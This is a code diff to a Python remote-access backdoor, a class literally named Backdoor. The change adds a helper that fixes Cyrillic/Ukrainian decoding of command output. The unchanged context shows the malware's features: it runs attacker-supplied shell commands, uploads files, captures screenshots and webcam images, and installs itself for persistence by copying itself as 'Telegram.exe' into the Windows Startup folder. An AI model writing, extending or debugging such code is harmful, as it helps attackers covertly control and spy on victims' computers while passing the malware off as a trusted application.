@@ -18,6 +18,14 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from playsound import playsound
 
 
+def UkDecode(text):
+    text = text.decode("cp866")
+    for i in range(len(text) - 1):
+        if text[i] == "?":
+            text = text[:i] + "і" + text[i+1:]
+    return text
+
+
 class Backdoor:
     def __init__(self, ip, port):
         con_status = False
@@ -56,7 +64,7 @@ class Backdoor:
             #     os.system(command)
 
             try:
-                res = subprocess.check_output(command, shell = True).decode("cp866")
+                res = UkDecode(subprocess.check_output(command, shell = True))
                 return res
             except Exception as err:
                 return str("[~] Check your commnad")
@@ -104,7 +112,7 @@ class Backdoor:
                     file_content = command.replace(f"upload {file_name} ", "")
                     command_result = self.write_file(file_name, file_content)
                 elif command.split()[0] == "screenshot":
-                    username = subprocess.check_output("echo \%username%", shell = True).decode("cp866")[1:-2:]
+                    username = UkDecode(subprocess.check_output("echo \%username%", shell = True))[1:-2:]
                     path = f"C:\\Users\\{username}\\Documents"
                     cmd = f'del "{path}\\screen.png"'
                     
@@ -114,7 +122,7 @@ class Backdoor:
                     os.system(cmd)
 
                 elif command.split()[0] == "camera":
-                    username = subprocess.check_output("echo \%username%", shell = True).decode("cp866")[1:-2:]
+                    username = UkDecode(subprocess.check_output("echo \%username%", shell = True))[1:-2:]
                     path = f"C:\\Users\\{username}\\Documents"
                     cmd = f'del "{path}\\camera.jpg"'
                     try:
@@ -137,7 +145,7 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-username = subprocess.check_output("echo \%username%", shell = True).decode("cp866")[1:-2:]
+username = UkDecode(subprocess.check_output("echo \%username%", shell = True))[1:-2:]
 path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 command = f'copy Telegram.exe "{path}"'
 os.system(command)
